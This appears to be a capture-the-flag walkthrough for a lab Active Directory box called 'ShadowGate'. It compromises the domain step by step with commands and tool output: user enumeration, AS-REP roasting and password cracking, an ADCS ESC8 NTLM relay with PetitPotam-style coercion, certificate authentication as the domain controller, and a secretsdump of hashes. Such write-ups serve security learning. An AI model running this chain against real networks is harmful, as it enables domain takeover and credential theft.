# ShadowGate

## Enumeration

> Nmap Scan Result&#x20;

```bash
rustscan -a 10.1.109.249 --  -sCV -T4 -Pn -oA nmap/rustscan
```



* Looks like we have many open ports&#x20;
* Let generate hosts file using `nxc` and then we will enumerate open ports using `nxc-sweeep`

```bash
nxc smb 10.1.109.249  -u '' -p '' --generate-hosts-file hosts
```

* Now time for `nxc-sweep` : which enumerates different modules like `ldap,smb,ssh,winrm,rdp` at once let's have a look at that

```bash
RDP         10.1.109.249    3389   DC01             [-] shadow.gate\ :  (STATUS_LOGON_FAILURE)
WINRM       10.1.109.249    5985   DC01             [-] shadow.gate\ : 
SMB         10.1.109.249    445    DC01             [-] shadow.gate\ :  STATUS_LOGON_FAILURE 
```

* All We can see is a logon\_failure , now lets enumerate users&#x20;

### Enumerating Users via NXC&#x20;

```bash
nxc smb 10.1.109.249 -u '' -p '' --users 
SMB         10.1.109.249    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.109.249    445    DC01             [+] shadow.gate\: 
SMB         10.1.109.249    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.1.109.249    445    DC01             Administrator                 2026-01-11 11:33:05 0       Built-in account for administering the computer/domain 
SMB         10.1.109.249    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.1.109.249    445    DC01             krbtgt                        2026-01-12 02:45:27 0       Key Distribution Center Service Account 
SMB         10.1.109.249    445    DC01             ATHENA                        2026-03-04 15:23:19 0        
SMB         10.1.109.249    445    DC01             mbrownlee                     2026-03-04 15:24:05 0        
SMB         10.1.109.249    445    DC01             bbrown                        2026-01-15 14:24:07 0        
SMB         10.1.109.249    445    DC01             jtrueblood                    2026-04-28 18:14:47 0        
SMB         10.1.109.249    445    DC01             jsmith                        2026-03-04 15:26:29 0        
SMB         10.1.109.249    445    DC01             clocke                        2026-03-04 15:24:32 0        
SMB         10.1.109.249    445    DC01             tclarke                       2026-03-04 15:25:33 0        
SMB         10.1.109.249    445    DC01             jbradford                     2026-03-04 15:24:59 0        
SMB         10.1.109.249    445    DC01             amoss                         2026-03-04 15:25:52 0        
SMB         10.1.109.249    445    DC01             [*] Enumerated 12 local users: SHADOW
```

```bash
awk 'NR > 3 {print $5}' users | head -n -1
```

```
Administrator
Guest
krbtgt
ATHENA
mbrownlee
bbrown
jtrueblood
jsmith
clocke
tclarke
jbradford
amoss
```

### AS-REP Roasting&#x20;

* Retrieving Hashes of Valid Users using `impacket-GetNPUsers`&#x20;

```bash
impacket-GetNPUsers shadow.gate/ -u user_list.txt -format hashcat -outputfile hashes -reques
```

* Brute-Forcing User's hash using `john`

```bash
head -n 5 hashes > forjohn  && john forjohn -w=/usr/share/wordlists/rockyou.txt
```

* Now Verfy Creds with `nxc-sweep`

```bash
nxc-sweep shadow.gate -u jtrueblood -p blood_brothers
[*] Starting NXC sweep for shadow.gate as jtrueblood ...

[+] Port 445 open. Checking smb ...
SMB         10.1.109.249    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.109.249    445    DC01             [+] shadow.gate\jtrueblood:blood_brothers 
SMB         10.1.109.249    445    DC01             [*] Enumerated shares
SMB         10.1.109.249    445    DC01             Share           Permissions     Remark
SMB         10.1.109.249    445    DC01             -----           -----------     ------
SMB         10.1.109.249    445    DC01             ADMIN$                          Remote Admin
SMB         10.1.109.249    445    DC01             C$                              Default share
SMB         10.1.109.249    445    DC01             CertEnroll      READ            Active Directory Certificate Services share
SMB         10.1.109.249    445    DC01             IPC$            READ            Remote IPC
SMB         10.1.109.249    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.1.109.249    445    DC01             SYSVOL          READ            Logon server share 

[+] Port 5985 open. Checking winrm ...
WINRM       10.1.109.249    5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:shadow.gate) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.1.109.249    5985   DC01             [-] shadow.gate\jtrueblood:blood_brothers

[+] Port 3389 open. Checking rdp ...
RDP         10.1.109.249    3389   DC01             [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC01) (domain:shadow.gate) (nla:True)
RDP         10.1.109.249    3389   DC01             [+] shadow.gate\jtrueblood:blood_brothers 

[-] Port 1433 closed/filtered. Skipping mssql

[-] Port 21 closed/filtered. Skipping ftp

[+] Port 389 open. Checking ldap ...
LDAP        10.1.109.249    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:shadow.gate) (signing:None) (channel binding:Never) 
LDAP        10.1.109.249    389    DC01             [+] shadow.gate\jtrueblood:blood_brothers 

[*] All active services checked.
```

## AD-CS Vulnerability (ESC8)

* Now We will try find vulnerablity using `certipy-find` modules&#x20;

```bash
nxc ldap shadow.gate -u jtrueblood -p blood_brothers -M certipy-find 
LDAP        10.1.109.249    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:shadow.gate) (signing:None) (channel binding:Never) 
LDAP        10.1.109.249    389    DC01             [+] shadow.gate\jtrueblood:blood_brothers 
CERTIPY-... 10.1.109.249    389    DC01             Certificate Authorities
CERTIPY-... 10.1.109.249    389    DC01               0
CERTIPY-... 10.1.109.249    389    DC01                 CA Name                             : shadow-DC01-CA
CERTIPY-... 10.1.109.249    389    DC01                 DNS Name                            : DC01.shadow.gate
CERTIPY-... 10.1.109.249    389    DC01                 Certificate Subject                 : CN=shadow-DC01-CA, DC=shadow, DC=gate
CERTIPY-... 10.1.109.249    389    DC01                 Certificate Serial Number           : 749A4BA2BEA3CFBC41ECDFAEE502E46C
CERTIPY-... 10.1.109.249    389    DC01                 Certificate Validity Start          : 2026-01-12 02:50:31+00:00
CERTIPY-... 10.1.109.249    389    DC01                 Certificate Validity End            : 2046-01-12 03:00:31+00:00
CERTIPY-... 10.1.109.249    389    DC01                 Web Enrollment
CERTIPY-... 10.1.109.249    389    DC01                   HTTP
CERTIPY-... 10.1.109.249    389    DC01                     Enabled                         : True
CERTIPY-... 10.1.109.249    389    DC01                   HTTPS
CERTIPY-... 10.1.109.249    389    DC01                     Enabled                         : False
CERTIPY-... 10.1.109.249    389    DC01                 User Specified SAN                  : Disabled
CERTIPY-... 10.1.109.249    389    DC01                 Request Disposition                 : Issue
CERTIPY-... 10.1.109.249    389    DC01                 Enforce Encryption for Requests     : Enabled
CERTIPY-... 10.1.109.249    389    DC01                 Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
CERTIPY-... 10.1.109.249    389    DC01                 Permissions
CERTIPY-... 10.1.109.249    389    DC01                   Owner                             : SHADOW.GATE\Administrators
CERTIPY-... 10.1.109.249    389    DC01                   Access Rights
CERTIPY-... 10.1.109.249    389    DC01                     ManageCa                        : SHADOW.GATE\Administrators
CERTIPY-... 10.1.109.249    389    DC01                                                       SHADOW.GATE\Domain Admins
CERTIPY-... 10.1.109.249    389    DC01                                                       SHADOW.GATE\Enterprise Admins
CERTIPY-... 10.1.109.249    389    DC01                     ManageCertificates              : SHADOW.GATE\Administrators
CERTIPY-... 10.1.109.249    389    DC01                                                       SHADOW.GATE\Domain Admins
CERTIPY-... 10.1.109.249    389    DC01                                                       SHADOW.GATE\Enterprise Admins
CERTIPY-... 10.1.109.249    389    DC01                     Enroll                          : SHADOW.GATE\Authenticated Users
CERTIPY-... 10.1.109.249    389    DC01                 [!] Vulnerabilities
CERTIPY-... 10.1.109.249    389    DC01                   ESC8                              : Web Enrollment is enabled over HTTP.
CERTIPY-... 10.1.109.249    389    DC01             Certificate Templates                   : [!] Could not find any certificate templates

```

{% embed url="https://www.hackingarticles.in/adcs-esc8-ntlm-relay-to-ad-cs-http-endpoints/" %}

* Lets go with `Method 2` from the article&#x20;
* Start a relay attack&#x20;

```bash
impacket-ntlmrelayx  -t http://shadow.gate/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

### Coerce DC1 to Authenticate with nxc

* This command targets DC1, forces an SMB authentication attempt to the relay listener

```bash
nxc smb 10.1.109.249  -u jtrueblood  -p blood_brothers -d shadow.gate  -M coerce_plus -o LISTENER=<VPN_IP>
SMB         10.1.109.249    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.109.249    445    DC01             [+] shadow.gate\jtrueblood:blood_brothers 
COERCE_PLUS 10.1.109.249    445    DC01             VULNERABLE, DFSCoerce
COERCE_PLUS 10.1.109.249    445    DC01             VULNERABLE, PetitPotam
COERCE_PLUS 10.1.109.249    445    DC01             VULNERABLE, PrinterBug
COERCE_PLUS 10.1.109.249    445    DC01             VULNERABLE, PrinterBug
COERCE_PLUS 10.1.109.249    445    DC01             VULNERABLE, MSEven
```

* We will able to get certificates sometime like :&#x20;

```bash
[*] (SMB): Authenticating connection from /@10.1.109.249 against http://shadow.gate SUCCEED [1]
[*] http:///@shadow.gate [1] -> Generating CSR...
[*] http:///@shadow.gate [1] -> CSR generated!
[*] http:///@shadow.gate [1] -> Getting certificate...
[*] (SMB): Received connection from 10.1.109.249, attacking target http://shadow.gate
[*] http:///@shadow.gate [1] -> GOT CERTIFICATE! ID 3
[*] http:///@shadow.gate [1] -> Writing PKCS#12 certificate to ./DC01.shadow.gate.pfx
```

* Now we will user `certify-ad` to authenticate the DC$1 with `DC01.shadow.gate.pfx` file&#x20;

```bash
certipy-ad auth -pfx DC01.shadow.gate.pfx -dc-ip 10.1.109.249 
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC01.shadow.gate'
[*]     Security Extension SID: 'S-1-5-21-243493930-1113464705-3012771586-1000'
[*] Using principal: 'dc01$@shadow.gate'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information

```

* Look like we aren't sync with the server/target time&#x20;
* Let's fix that&#x20;

```
ntpdate -b <IP> && ntpdate -s <IP>
```

```bash
certipy-ad auth -pfx DC01.shadow.gate.pfx -dc-ip 10.1.109.249 
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC01.shadow.gate'
[*]     Security Extension SID: 'S-1-5-21-243493930-1113464705-3012771586-1000'
[*] Using principal: 'dc01$@shadow.gate'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc01.ccache'
[*] Wrote credential cache to 'dc01.ccache'
[*] Trying to retrieve NT hash for 'dc01$'
[*] Got hash for 'dc01$@shadow.gate': somethingweneedtotryandget
```

* Now we can dump hashes using `impacket-secretdump`&#x20;

```bash
impacket-secretsdump 'dc01$@shadow.gate' -hashes ''
```
